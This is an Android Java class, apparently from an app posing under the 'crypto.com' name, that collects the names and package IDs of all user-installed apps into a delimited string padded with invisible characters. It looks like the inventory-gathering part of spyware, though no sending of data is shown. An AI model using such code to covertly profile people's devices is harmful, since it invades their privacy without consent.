package crypto.com;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;

import java.util.List;

public class Kakkweh {

	private Context context;

	public Kakkweh(Context context) {
		this.context = context;
	}

	public String getInstalledApps() {
		StringBuilder installedAppsData = new StringBuilder();

		PackageManager packageManager = context.getPackageManager();
		List<PackageInfo> packages = packageManager.getInstalledPackages(PackageManager.GET_META_DATA);

		for (PackageInfo packageInfo : packages) {
			ApplicationInfo appInfo = packageInfo.applicationInfo;
			if ((appInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
				// Exclude system apps

				String appName = appInfo.loadLabel(packageManager).toString();
				String packageName = appInfo.packageName;

				installedAppsData.append("‎ ").append(appName).append("%%").append("‎‎ ").append(packageName)
						.append("||");
			}
		}

		return installedAppsData.toString();
	}
}
